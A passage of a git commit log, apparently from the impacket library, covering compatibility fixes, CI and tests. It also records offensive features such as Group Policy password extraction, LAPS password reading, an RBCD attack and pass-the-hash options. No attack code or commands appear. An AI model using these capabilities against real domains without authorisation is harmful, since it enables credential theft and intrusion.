    This test also shows that #1069 fix is no longer necessary, since `DeliveryQoS` is zero after b1499ae82242be2002dd2790ab5691c27c6c5962 & bc57bf7404a5821efc82887d0bed083c52f9b4d0 changes.
    
    It should fail due to splash damage of the aforementioned changes. Upcoming fix...

commit 90ce4b7d0b1ee4f258927e26035e4bca0e43b7ca
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 9 12:10:58 2021 -0300

    And going back to dev version

commit 090cf0cc92f6da1a3efe366230d94608a265deba
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 9 11:18:18 2021 -0300

    About to tag a release

commit 8849e5ad177444651af50f574c4618b49ea3bfb9
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 13:44:28 2021 -0300

    Minor adjustments in test_win32_current_time_class_parsing
    
    Invert expected and actual values order in assertEqual(), according with PyCharm's unittest runner interpretation of failures.
    
    Avoid sample patching code to be considered by PyCharm's unittest runner as an example to be run.

commit f5dab5ca76b60b9436f18d1ba5fd48abfa3626e1
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 02:43:53 2021 -0300

    Replace unittest.TextTestRunner.run by unittest.main
    
    In this way, tests return the execution status to the OS shell, making the tox run fail and report failures in GitHub (hopefully)

commit bc57bf7404a5821efc82887d0bed083c52f9b4d0
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 02:21:21 2021 -0300

    Adapt changes for Python 3
    
    Adapt b1499ae82242be2002dd2790ab5691c27c6c5962 changes to run both in Python 2 and 3

commit b1499ae82242be2002dd2790ab5691c27c6c5962
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 01:47:31 2021 -0300

    Parse the NdTable when getting object properties
    
    As suggested in d757c3a402e59c9c6e01d6a457a10af4dec836f3, parse the NdTable to decide whether a zero value is actually a zero integer or a null default. For further information about the NdTable, visit https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/65bcd0c2-b3f3-49a7-b4aa-c972cdc0774b from the [MS-WMIO] open specification.
    
    This fixes the test implemented in c511b6ff051fa55abed5eb1920b3fb08d2647785, failure sample:
    https://github.com/SecureAuthCorp/impacket/pull/1074/checks?check_run_id=2770395932#step:7:240

commit b68c35dced8ec4db5b54e893258bd23c72844ef4
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 01:29:12 2021 -0300

    Execute offline WMI tests in continuous integration system

commit c511b6ff051fa55abed5eb1920b3fb08d2647785
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Jun 7 23:12:25 2021 -0300

    Add offline WMI test for Win32_CurrentTime parsing
    
    This test checks the result of the following WMI query
    when the target's time contains zeroes in its fields
    
    Select * from Win32_UTCTime

commit 25c62f65a420e7ce3541c9099e32e91f6e9d3bd9
Merge: 8aa5626a be3d9903
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri May 28 19:52:32 2021 -0300

    Merge pull request #1088 from SecureAuthCorp/pr-605-catchup
    
    Add silent command

commit be3d9903a82f483f9b934e4ae413bb82b1aaa276
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri May 28 19:44:14 2021 -0300

    Update help section

commit 8aa5626a8947754cb1d09ede083f8c31bde08269
Merge: 0d3a6143 6c74308c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri May 28 16:27:10 2021 -0300

    Merge pull request #1086 from p0dalirius/get-gpppasswords-add-single-xml-file-parsing
    
    Get gpppasswords add single xml file parsing

commit 6c74308cf61b17d78776e43725efaab9e7c466b5
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri May 28 09:41:12 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 84cdc9d15ce6595e362c4e524b6a6804513a00dc
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri May 28 09:41:03 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 3fe60884046ecc410e7fbfd23af1f3ddacdd89dc
Merge: e7261617 2f5c2476
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu May 27 16:04:28 2021 -0700

    Merge branch 'master' into pip-install

commit 0d3a6143300c6ac3eb1e7e9c6837794a29b187a1
Merge: 2f5c2476 8da84f7e
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu May 27 19:48:57 2021 -0300

    Merge pull request #1085 from p0dalirius/fix-get-gpppassword
    
    Fixing SessionError in Get-GPPPassword.py

commit 7dd6abb75df0a41aeaf04974de999bdce5e1ac7f
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu May 27 17:01:24 2021 -0300

    Fix error when -silentcommand is not used

commit d96b838ede67fbd49bc38962d20889305aafdd4d
Merge: 04d09b0e 2f5c2476
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu May 27 17:01:01 2021 -0300

    Merge branch 'master' into pr-605-catchup
    
    # Conflicts:
    #       examples/dcomexec.py
    #       examples/wmiexec.py

commit 9d646406cda0a7957ee5c6006e56acbee3c71857
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Tue May 25 16:48:31 2021 +0200

    Update Get-GPPPassword.py

commit 986102e5b070c83108f4e1be620efb52887957f9
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Tue May 25 16:45:48 2021 +0200

    Added single XML file parsing on Get-GPPPassword

commit 8da84f7e5017c7dbc60a2cf589818609c82a7ce5
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Tue May 25 15:03:34 2021 +0200

    Fixing SessionError in Get-GPPPassword.py
    
    Fixing smbconnection.SessionError when accessing forbidden directories in Get-GPPPassword.py

commit 2f5c24760d57ec9b1c3a6f67ea32792dcb939b9a
Merge: 7c21156a 2e16ba01
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 17:09:00 2021 -0300

    Merge pull request #1076 from AdamCrosser/master
    
    Additional LDAP Interactive Shell Features

commit 7c21156a67bb9f19e7181da216f36721f0d940f7
Merge: 6c854dac 6118e9db
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 12:18:26 2021 -0300

    Merge pull request #1064 from ShutdownRepo/get-gpppassword
    
    Added Get-GPPPassword

commit 6c854dacd8502943bd38d40779819af5d6734722
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 12:16:33 2021 -0300

    Update requirements in setup.py

commit 243ce175cdf357768471fcc37ca7290a09108934
Merge: 2e3cd7cd c2749e47
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 11:41:28 2021 -0300

    Merge pull request #1019 from mxrch/master
    
    Added cat command to smbclient

commit 2e3cd7cd7da738914df9df315ee0d2dca98945a6
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 18 12:02:45 2021 -0300

    Tests: Removed some deprecation warnings (#1070)
    
    Replaced some test alias that were deprecated long time ago and were showing some warnings in our tests:
    
    - `assert_` with `assertTrue`
    - `assertEquals` with `assertEqual`

commit e0ea098ee5fc727a15392aca81db1383fdb74592
Merge: a0612f00 7d084049
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue May 18 10:26:20 2021 -0300

    addcomputer.py: Enable the machine account created via SAMR.
    
    After adding a computer over SMB, the machine account is created but is disabled by default.
    
    This PR:
    - Enables the machine account using the SamrSetInformationUser2 method as detailed in [MS-SAMR] Section 4.2.
    
    It fixes #667 (comment)

commit e726161736b6d2bd1ea43ce535b163a8d5514b71
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 18 06:20:10 2021 -0700

    Setup: Using our own recommended pip calls

commit 7d084049ad7adb9c0b137fe073d903be0c14052a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon May 17 22:07:33 2021 -0300

    Enable the machine account created via SAMR in addcomputer.py

commit a0612f006b1bf5089d5c27661f595f55b3604982
Merge: 24a0ae6f 4cf864f2
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon May 17 12:30:49 2021 -0300

    Merge pull request #1060 from nuschpl/master
    
    more universal approach, especially on OSX with homebrew where pip3 a…

commit 2e16ba010e92c5e0de9b26f76319321a1061d2c8
Merge: 9d484a83 48ee1050
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:40:13 2021 -0500

    Merge branch 'master' of github.com:AdamCrosser/impacket

commit 9d484a83dfa2aa973ba86da021c599653fa4318e
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:40:05 2021 -0500

    Remove SMBClient Change

commit 48ee10507a1fdeeba367016a1cb82e73835c2324
Author: AdamCrosser <45573557+AdamCrosser@users.noreply.github.com>
Date:   Mon May 10 17:38:29 2021 -0500

    Delete ldap_shell.py

commit 1595bd369415589b3b1aff31e1392a4b38bebe04
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:14:44 2021 -0500

    Updated Help Menu

commit 5874558db403d1da7524fd71e533e366eaa2fc6b
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:12:00 2021 -0500

    Added Add Computer Command

commit 940c4e572b726492e7b5d7952e47896fbb10df72
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 16:27:49 2021 -0500

    LAPS Password Reading Capability

commit cd9965b2598f1a2580fc7c7180d929e2eff82d65
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 09:48:40 2021 -0500

    Added Input Validation to set_rbcd Command

commit 2546e4527aca91b1b9da18e514b2668101f8a55b
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Sat May 8 04:26:50 2021 -0300

    Improve wmipersist.py error checking
    
    This improves wmipersist.py error checking by considering the right sign of the error code and trying to resolve it as a WBEM error, in order to get a more meaningful failure message
    
    Before error samples:
    [-] Adding FilterToConsumerBinding - ERROR (0x-7ffbeff1)
    [-] Removing EventFilter EF_NonExisting - ERROR (0x-7ffbeffe)
    
    After error samples:
    [-] Adding FilterToConsumerBinding - ERROR: WBEM_E_INVALID_OBJECT (0x8004100f)
    [-] Removing EventFilter EF_NonExisting - ERROR: WBEM_E_NOT_FOUND (0x80041002)

commit 2fefb9d60174ba7d34233bd33bc83cf59e6cc5cf
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Sat May 8 00:59:14 2021 -0300

    Set the default_value_is_inherited flag when the property is inherited
    
    In contrast with d0d5ad5e940129847b9330773d722040ed6b1bb2, this does change the behaviour for the ndTable flags. If we know the fact that the current property is inherited, and we are setting it as a null default, also set it as an inherited default.

commit 96027921230642cab989d718e40ffce1248ebfea
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Sat May 8 00:22:24 2021 -0300

    Extend comments about CIM_TYPE_OBJECT not yet implemented properties
    
    This is what I understand about why we set the default_value_is_inherited flag in the ndTable for CIM_TYPE_OBJECT properties, which we don't currently implement: to increase the chance that this value is filled from a parent class, since we aren't providing one.

commit d0d5ad5e940129847b9330773d722040ed6b1bb2
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Fri May 7 23:06:10 2021 -0300

    Refactor null and default flags table values
    
    This change doesn't affect behaviour, it just adds more semantic to the flags we are setting. It also removes the comments with text from Microsoft documentation (1), since this is self-documented by __ndEntry() parameters now.
    
    (1): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/ed436785-40fc-425e-ad3d-f9200eb1a122

commit e3e9af93240fd1d9da2156a4832ef8133742d100
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Fri May 7 17:27:30 2021 -0500

    RBCD Attack

commit 5b83608ff1b659fe44d41e1fb976e238cf613819
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Fri May 7 10:13:17 2021 -0500

    Updated LDAP Shell

commit 06af814e78fd3f8adfb7025154c471f005f0c426
Author: Jonathan <w0rmh013@users.noreply.github.com>
Date:   Wed May 5 08:53:08 2021 +0300

    Fixed wrong Enum type when dumping credential blob

commit 24a0ae6f7298a8245560e1144788b6fc49928a41
Merge: f0668f3e e59ff693
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue May 4 12:36:29 2021 -0300

    Merge pull request #913 from Rcarnus/httpServerFixes
    
    httpRelayServer: read body content for POST requests

commit f0668f3ee691b6ec60cda4b580b17cdf97b2aa88
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon May 3 15:28:39 2021 -0300

    Added SimpleSMBServer tests (#1067)
    
    Adding some pseudo-functional tests for the `SimpleSMBServer`. This spins up a `SimpleSMBServer` instance and connects to it using our own `SMBConnection`. Includes checks for #1066.
    
    This PR:
    - Adds basic unit tests for the path validation function introduced in #1066.
    - Adds pseudo-functional tests for `SimpleSMBServer`, checking login, list, get and put calls.

commit 49c643bf66620646884ed141c94e5fdd85bcdd2f
Merge: 91902eaf 6688da5d
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon May 3 12:43:02 2021 -0300

    Merge pull request #1066 from omriinbar/master
    
    Fix Path Traversal vulnerabilities by checking path prefix against in…

commit 91902eafb68fea932cf2350cab329f15afa554e5
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Apr 30 17:28:29 2021 -0300

    wmipersist.py: Fixed filterBinding error (#1069)
    
    * Sets the `filterBinding.DeliveryQoS` to `0` when defining the filterBinding in `wmipersist.py` example script.

commit 6118e9db2a4e34af71b72768bb82e68d86023853
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Thu Apr 29 21:58:53 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 0b6f3a049203f8941cb1e76db5a798b067d8f0a0
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Thu Apr 29 21:58:48 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit fc72ebad86c74a4ff45c2a0172dc77328d4d3f2f
Merge: cb6d43a6 fd1d0ea9
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Apr 27 17:47:42 2021 -0300

    Merge pull request #1044 from zexusx26/user_can_select_comversion
    
    User can select comversion #1031

commit 6688da5d97592269aae72b3a00dc1ab186c0b33d
Author: OmriI <omri.inbar@checkmarx.com>
Date:   Mon Apr 26 20:02:57 2021 +0300

    Changed STATUS_ACCESS_DENIED and STATUS_NOT_SUPPORTED to STATUS_OBJECT_PATH_SYNTAX_BAD

commit fd1d0ea9a675d120cc8431f10806ebb88daa96d6
Merge: 900b0f4a cb6d43a6
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 08:20:43 2021 +0500

    Merge branch 'master' into user_can_select_comversion

commit 900b0f4a7cadd803ece98a55e8d25311763fe521
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:51:17 2021 +0500

    Update impacket/dcerpc/v5/dcomrt.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit e0cf5a0dcdf60198ae2232331bef1456b570044d
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:51:11 2021 +0500

    Update examples/wmiquery.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit b20aea22b15ee365e57bcb1446743f2449cf91cb
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:51:01 2021 +0500

    Update examples/wmiquery.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 4696059e7e4fd642d0b8ff32d5635b9b2bd30bdf
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:56 2021 +0500

    Update examples/wmipersist.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit dc699d3d0ff27ecb64a38681f1295a5a95d8d4ae
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:53 2021 +0500

    Update examples/wmipersist.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 7bdfdd9c6ec31f28e88d2feec2fd8df7982a6bcd
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:49 2021 +0500

    Update examples/wmiexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit f76d2ba5091ae78793fd3403fa48c7b1258a258e
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:43 2021 +0500

    Update examples/wmiexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 1ab0aa40a6b18cc20e8addd25218c0d20b27aee5
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:37 2021 +0500

    Update examples/dcomexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit df11c391baf84f5410cb7a17206cf44b5abadfaa
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:24 2021 +0500

    Update examples/dcomexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 99bd29e3995c254e2d6f6c2e3454e4271665955a
Author: OmriI <omri.inbar@checkmarx.com>
Date:   Sun Apr 25 14:06:02 2021 +0300

    Fix Path Traversal vulnerabilities by checking path prefix against incoming filename

commit cb6d43a677c338db930bc4e9161620832c1ec624
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Apr 22 17:43:00 2021 -0300

    Moved docker container to Python 3.8 (#1057)
    
    Using Python 3.8 Alpine-based as our base image for the default Docker build, as we're slowly trying to move away from Python 2.7. This increases the image size a little bit due to a new Rust dependency needed to have `cryptography` running in Alpine (see https://cryptography.io/en/latest/installation/#alpine).
    
    This PR:
    - Changes the base image to `python:3.8-alpine`.
    - Adds dependencies needed to have `cryptography` running in Alpine.

commit 019dcc9476d9764adc77dcab02d6d0a1a6fb2167
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 22 16:37:15 2021 -0300

    Fix the key version number (kvno) assignment

commit a45f331360ce2abdb1c517a35a1c407725b0d761
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Apr 22 10:02:29 2021 -0300

    Refactored the credentials parsing functions (#1058)
    
    Similar to and on top of #1053, this moves the credentials/account parsing regex to an utils module and reduces duplicated code in example scripts.
    
    The expected credential format is:
    `<DOMAIN></USERNAME><:PASSWORD>`
    
    Note that the regular expression used in `exchanger.py` was different (excluded ':' from the hostname) but I didn't found any reason to keep it different from all other scripts.
    
    This PR:
    - Moved credentials parsing routine to an utils module.
    - Added unit tests for the new function.
    - Using the new function across example scripts that accept a credential/account.

commit adb230256d1295fdb6c50a43a40fc43165901a3b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Apr 22 09:11:33 2021 -0300

    Refactored the target parsing functions (#1053)
    
    In reviewing #1051 (and related #347) we found out that there's some ugly duplicated code that's better suited for an utils function.
    
    The expected target format is:
    `<DOMAIN></USERNAME><:PASSWORD>@HOSTNAME`
    
    This PR:
    - Moved target parsing routine to an utils module.
    - Added unit tests for the new function.
    - Using the new function across example scripts that accept a target.

commit fea485d2e4a53e9c26c02678237df1fc6621b5f4
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Apr 21 10:08:25 2021 -0300

    Attempt to fix Python 3.9 compatibility issue with Thread.is_alive (#1061)
    
    As mentioned in #946 and #1054, one unit test of the `ImpactPacket` suite was using the `isAlive` method which was already deprecated in Python 3.8, and removed in Python 3.9. This changes its use to `is_alive`, introduced back in Python 2.6!

commit feacde109b329bcfca13fd7e4c77972eff3c1bdb
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Apr 21 13:40:24 2021 +0200

    Added Get-GPPPassword
    Added Get-GPPPassword in examples. It's a python script for extracting and decrypting Group Policy Preferences passwords using streams for treating files instead of mounting shares, allowing for running this script inside regular docker containers. This also allows for pass-the-hash, pass-the-ticket, pass-the-key, overpass-the-hash, features that the Metasploit Framework doesn't offer.

commit 4e64bb0aca9f413385dcd49c267d08c31ba3d493
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Apr 21 13:38:52 2021 +0200

    User-defined password for LDAP attack addComputer
    - users can now define a custom password for the LDAP attack addComputer
    - edited the random generation of passwords for addComputer and addUser in order to remove some inconvenient special chars like quotes

commit 4cf864f2e076df89267130864d8cc278392c3173
Author: nusch <nusch@xps13>
Date:   Tue Apr 20 08:20:00 2021 +0200

    more universal approach, especially on OSX with homebrew where pip3 and python3 may point often to different locations of modules

commit f9453d21e986a0c01a56254dffe4bfbe333f8ea0
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 16:53:26 2021 -0300

    Fixed Ping examples (#1059)
    
    While reviewing #1054, we found that ping examples where using old strings instead of bytes as payloads, and this is breaking in Python >2.

commit eaaaf46ba7c327d46acea9d294e51d86e96a6bbc
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 11:58:34 2021 -0700

    Fix Python 3 compat issue with ImpactPacket validate index
    
    After working on #1054 and moving to use frombytes/tobytes we found a Python 3 compat issue with bytes/string in PacketBuffer __validate_index. This fixes a wrong use of a string instead of bytes.

commit 80b02561b43812a00ec2a9c739f01c96c1a3b650
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 11:07:54 2021 -0700

    Proper use of array_tobytes missing from #1054
    
    Small change for properly use the array_tobytes function.

commit 976d39a14aa3fa8b13b7eea9560ac6158bf2b637
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 14:57:43 2021 -0300

    Attempt to fix Python 3.9 compatibility issue with array.array tostring/fromstring methods (#1054)
    
    Python 3.9 removed the `array.array` `tostring` and `fromstring` methods (see https://docs.python.org/3/whatsnew/3.9.html#removed).
    Note that the `tostring` and `fromstring` methods were already deprecated since Python 3.2, but aliases to the new `tobytes` and `frombytes` were provided (see https://docs.python.org/3/library/array.html#array.array.tobytes).
    
    This:
    - Adds helper function to use `tostring` and `fromstring` in Python <3.2 versions and `tobytes` and `frombytes` in Python>=3.2.
    - Replaces uses of `tostring` and `fromstring` with the new helper function.

commit efbe78bb1f8b5f276881ce6b98ff9110c8faa598
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Apr 16 15:31:20 2021 -0300

    Added basic GitHub Actions workflow (#1055)
    
    As we were running with some issues with Travis (e.g. limited run minutes), we're adding GitHub Actions as a separate CI unit tests runner. Tests are executed via Tox in virtual environments so we should expect the same results as in Travis, although we're not yet replacing it at this point.
    
    * Adds a basic workflow that:
      * Runs flake8 for syntax errors and then runs non-remote unit tests using Tox.
      * Runs on Python 2.7, 3.6, 3.7, 3.8 and allows failures on 3.9 as we do in Travis.
    * Adds a job that just builds the contributed docker image to check it's not failing.

commit 73bf8cad094e2d9906af08aba7e1b38c83c226cb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 15 20:17:42 2021 -0300

    Fix the target processor in ntlmrelayx
    
    It addresses #914

commit cf683c0da9c119486eb289021b79fbdf0c947917
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 15 17:08:54 2021 -0300

    Revert "Fix the target processor in ntlmrelayx"
    
    This reverts commit d9be6fbe1264a68e4bdb29542882d51eb9ab18e4.

commit d9be6fbe1264a68e4bdb29542882d51eb9ab18e4
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 15 16:46:39 2021 -0300

    Fix the target processor in ntlmrelayx

commit 634ea887e6d591a039bd2780995210b8681b9ec0
Author: Ярослав Катаев <yakataev@ussc.ru>
Date:   Mon Mar 22 18:49:40 2021 +0500

    User can select comversion #1031

commit a16198c3312d8cfe25b329907b16463ea3143519
Merge: 14578b53 b7a53d84
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Mar 15 12:14:12 2021 -0300

    Merge pull request #1037 from snovvcrash/wmiexec-pwsh
    
    Add PowerShell option for semi-interactive shells in *exec.py

commit b7a53d8488308696d1e524a3c43b139e4bd909c3
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Mar 13 21:23:06 2021 +0300

    Fix PowerShell shell for MMC20 object
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit cb9f7bf8f68ae98bd6e7c54c7bac51eb425a8851
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Mar 13 21:14:37 2021 +0300

    Rename get and put actions

commit 14578b53079645a94f965199c7d0c4796a31b2f0
Merge: 90b17109 9cb5df93
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Mar 12 18:23:40 2021 -0300

    Merge pull request #1034 from snovvcrash/master
    
    Add Pass-the-Hash option for smbpasswd.py

commit 9cb5df934bad2f912367488e85d313e5e0469247
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Thu Mar 11 21:45:37 2021 +0300

    Split arguments by groups

commit 8b0293e1742e7fc409f5b2b70c524c147d8db33c
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Thu Mar 11 20:31:54 2021 +0300

    Add PowerShell option for semi-interactive shells

commit 90b171094cf7e2e0ebed071fe7cca647d3c78994
Merge: df00d15c 82c6d1f1
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Mar 9 14:03:16 2021 -0300

    Merge pull request #1035 from snovvcrash/wmiexec-pwsh
    
    Add PowerShell option for semi-interactive shell in wmiexec.py

commit 82c6d1f16058dbe4f0acf8c3f68d10212063b4da
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Mar 9 13:48:26 2021 +0300

    Add PowerShell option for semi-interactive shell

commit 04d09b0e6374877096b81e36965f04dacdbd23a6
Merge: 78a219db df00d15c
Author: mreski <micheal@blacklanternsecurity.com>
Date:   Mon Mar 8 20:43:10 2021 -0500

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 52e174462c0ac8824f7f2fdd88d3b98455004e02
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Mon Mar 8 18:11:38 2021 +0300

    Update description

commit 3ed44b2836ca8a7304badc0485d4148a4daa05fc
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Mar 6 21:12:18 2021 +0300

    Add Pass-the-Hash option

commit 0dfc99e9b42a7b3fa3edddae2c3b0a99bd6511b3
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Mar 6 20:05:46 2021 +0300

    Add Pass-the-Hash option

commit df00d15c82092a2a715ff1c191ea18f856d88314
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Mar 2 13:01:23 2021 -0300

    Adding encryption type constant

commit f6ea291a57b86c5eea527695a3568cb7aaf568cb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Mar 2 12:37:32 2021 -0300

    Adding [MS-KILE] 2.2.11 and 2.2.12 pre-authentication types constants

commit 3f3002e1c1dd78a5ee6100d6824ff7b65bbb92b6
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Feb 12 14:39:25 2021 -0800

    Updating maintainer
    
    Using our OpenSource address as mantainer

commit e4904b0d5c513d605e661dd1c0c5d9629f4f4770
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 9 17:02:24 2021 -0300

    Adding [MS-KILE] 2.2.11 and 2.2.12 structures

commit 3673c58885bc0c7bcba55bef8409cbb3029641a4
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 27 14:10:11 2021 -0300

    Fixing Python3 issue when serving SOCKS5 requests
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/1025

commit 7100210f6f8bf312ea436cd3dc022077ee6b0b09
Merge: 08cc17d9 27ca93be
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 11 16:22:20 2021 -0300

    Merge pull request #1017 from timgates42/bugfix_typo_getting
    
    docs: fix simple typo, gettting -> getting

commit 08cc17d931bc1d4fe9dfe19a2616f6d73068de35
Merge: 1dec03a4 49546f72
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 11 16:21:12 2021 -0300

    Merge pull request #1020 from snovvcrash/bronze-bit
    
    Compute NTHash and AESKey for the Bronze Bit attack automatically

commit 1dec03a45d55edd16f7a3e4a3c59774ff997c26d
Merge: ac307704 31dfb9c4
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 8 11:32:10 2021 -0300

    Merge branch 'snovvcrash-master'

commit 31dfb9c4b2077806bc7c7c77f686dfc968c0d750
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 8 11:31:25 2021 -0300

    Adding banner and adjust date.

commit 5fd08c3e4aa3b37f74258e4d4a718f0397860877
Merge: ac307704 b7288fdd
Author: asolino <bethus@gmail.com>
